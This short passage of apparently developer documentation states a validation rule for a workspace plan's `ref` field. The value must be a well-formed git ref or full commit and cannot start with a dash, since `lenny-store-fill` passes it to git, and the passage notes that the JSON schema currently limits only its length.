- `ref` is a well-formed ref name or a full commit, and it cannot begin with `-`, because `lenny-store-fill` passes it to git. The same check runs at bind, and the fill and the helper end their options before the ref. `schemas/workspaceplan-v1.json` constrains only its length today.
